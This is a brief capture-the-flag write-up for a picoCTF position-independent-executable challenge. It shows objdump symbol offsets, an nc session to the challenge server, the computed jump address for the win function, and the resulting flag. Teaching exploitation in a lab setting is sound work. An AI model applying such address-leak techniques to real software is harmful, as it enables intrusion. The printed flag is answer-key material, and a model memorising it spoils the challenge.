Use `objdump -t ./vuln`

```
00000000000012a7 g     F .text  0000000000000096              win
0000000000004020 g       .bss   0000000000000000              _end
00000000000011a0 g     F .text  000000000000002f              _start
0000000000004010 g       .bss   0000000000000000              __bss_start
000000000000133d g     F .text  00000000000000cc              main
```

```
└─$ nc rescued-float.picoctf.net 58860
Address of main: 0x5d48cdd8b33d
Enter the address to jump to, ex => 0x12345:
```

In this case `main` and `win` are on the same page so you just need the last 3 digits.

```
└─$ nc rescued-float.picoctf.net 58860
Address of main: 0x5d48cdd8b33d
Enter the address to jump to, ex => 0x12345: 0x5d48cdd8b2a7
Your input: 5d48cdd8b2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_f8845f06}
```